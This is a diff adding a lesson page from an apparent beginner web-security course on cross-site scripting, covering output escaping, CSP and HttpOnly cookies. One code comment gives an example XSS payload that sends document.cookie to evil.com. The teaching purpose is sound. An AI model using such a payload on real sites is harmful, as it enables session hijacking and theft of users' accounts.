@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Module 4: Learn how Cross-Site Scripting (XSS) works, HTML entity sanitization, Content Security Policy (CSP), and HttpOnly cookie defenses.">
+    <title>Module 4: Stopping XSS &amp; Code Injection | Junior Coders</title>
+    <link rel="stylesheet" href="../styles/main.css">
+</head>
+<body>
+    <main class="module-container">
+        <!-- Hero Header -->
+        <header class="module-header" style="background: linear-gradient(135deg, #059669, #0d9488); color: white; padding: 2.5rem; border-radius: 20px;">
+            <span class="badge" style="background: white; color: #059669; font-weight: 800;">Level 2</span>
+            <h1 style="color: white; margin: 0.5rem 0;">Web Defense: Stopping XSS 💉🛡️</h1>
+            <p>Neutralize Cross-Site Scripting. Learn context-aware HTML entity sanitization and Content Security Policy.</p>
+        </header>
+
+        <!-- The XSS Threat -->
+        <section class="content-section">
+            <h2>What is Cross-Site Scripting (XSS)?</h2>
+            <p>XSS occurs when an application accepts user text (like a comment or username) and renders it onto a web page without sanitization, allowing an attacker to inject and execute arbitrary <strong>JavaScript</strong> in other users' browsers.</p>
+            
+            <div style="background: #0f172a; padding: 1.5rem; border-radius: 12px; margin: 1rem 0; font-family: monospace; color: #f8fafc; line-height: 1.8;">
+                // ❌ DANGEROUS: Renders raw user comment directly into HTML<br>
+                echo "&lt;div class='comment'&gt;" . $_POST['comment'] . "&lt;/div&gt;";<br><br>
+                // If comment contains: &lt;script&gt;fetch('https://evil.com/steal?c=' + document.cookie)&lt;/script&gt;<br>
+                // The visitor's browser executes the script and leaks their session cookie!
+            </div>
+        </section>
+
+        <!-- HTML Entity Escaping -->
+        <section class="content-section">
+            <h2>The First Shield: Context-Aware Output Escaping</h2>
+            <p>Convert dangerous executable markup characters into harmless, inert HTML entities before rendering:</p>
+            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 0.75rem; margin-top: 1rem;">
+                <div style="background: #020617; padding: 1rem; border-radius: 8px; text-align: center; color: white;">
+                    <code>&lt;</code> ➔ <code>&amp;lt;</code>
+                </div>
+                <div style="background: #020617; padding: 1rem; border-radius: 8px; text-align: center; color: white;">
+                    <code>&gt;</code> ➔ <code>&amp;gt;</code>
+                </div>
+                <div style="background: #020617; padding: 1rem; border-radius: 8px; text-align: center; color: white;">
+                    <code>"</code> ➔ <code>&amp;quot;</code>
+                </div>
+                <div style="background: #020617; padding: 1rem; border-radius: 8px; text-align: center; color: white;">
+                    <code>&amp;</code> ➔ <code>&amp;amp;</code>
+                </div>
+            </div>
+
+            <div style="margin-top: 1rem; background: #0f172a; padding: 1.25rem; border-radius: 10px; font-family: monospace; color: #f8fafc;">
+                // ✅ Secure PHP Rendering:<br>
+                echo htmlspecialchars($comment, ENT_QUOTES, 'UTF-8');<br><br>
+                // ✅ Secure Client JavaScript:<br>
+                div.textContent = comment; // (Never use innerHTML for user data!)
+            </div>
+        </section>
+
+        <!-- CSP & HttpOnly -->
+        <section class="content-section">
+            <h2>Defense in Depth: CSP &amp; HttpOnly Cookies</h2>
+            <ul style="line-height: 1.8; color: #334155;">
+                <li><strong>Content Security Policy (CSP):</strong> HTTP response header telling the browser to strictly block any inline scripts that do not match an approved cryptographic nonce or domain.</li>
+                <li><strong><code>HttpOnly</code> Cookie Flag:</strong> Tells the browser that client-side JavaScript (`document.cookie`) has zero access to session cookies, neutralizing cookie theft!</li>
+            </ul>
+        </section>
+
+        <!-- Interactive Practice Challenge -->
+        <section class="content-section" style="background: #ecfdf5; border: 1px solid #a7f3d0; border-radius: 16px; padding: 1.5rem;">
+            <h2 style="color: #047857; margin-top: 0;">🧪 Your Turn: XSS Sanitizer Sandbox</h2>
+            <p>Visit the <a href="playground.html" style="color: #059669; font-weight: 700;">Cyber Defense Studio</a> tab <strong>XSS Sanitizer Sandbox</strong> and test injecting script tags, image error handlers, and JavaScript links!</p>
+        </section>
+
+        <!-- Navigation Footer -->
+        <footer style="display: flex; justify-content: space-between; align-items: center; margin-top: 3rem; padding-top: 1.5rem; border-top: 1px solid #e2e8f0;">
+            <a href="module3.html" class="btn-hero-secondary">← Module 3</a>
+            <a href="module5.html" class="btn-hero-primary">Next: Module 5 (Defeating SQLi) →</a>
+        </footer>
+    </main>
+</body>
+</html>
